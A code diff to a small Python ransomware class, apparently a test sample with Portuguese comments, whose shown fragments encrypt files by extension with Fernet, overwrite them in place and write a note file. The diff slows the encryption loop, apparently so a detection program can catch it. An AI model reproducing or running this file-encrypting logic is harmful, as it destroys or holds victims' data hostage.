@@ -1,6 +1,7 @@
 import os
 import argparse
 import pathlib
+from time import sleep
 from cryptography.fernet import Fernet
 
 # Caminho teste para criptografar/descriptografar
@@ -47,6 +48,7 @@ class Ransomware:
             for file in files_in_current_path:
                 if pathlib.Path(file).suffix in file_extensions:
                     file_abs_full_path = os.path.join(current_path, file)
+                    print(file)
 
                     with open(file_abs_full_path, 'rb') as file_bytes:
                         file_data = file_bytes.read()
@@ -57,8 +59,11 @@ class Ransomware:
 
                     with open(file_abs_full_path, 'wb') as file_bytes:
                         file_bytes.write(final_data)
+                        print(str(os.getpid()))
+                        sleep(0.08)
+                        # O programa só pega se o ransomware demorar no min 0.07s
 
-         # Criar o txt caso esteja criptografando
+     # Criar o txt caso esteja criptografando
         if action == "encrypt":
             Ransomware.createTxt(directory)
 
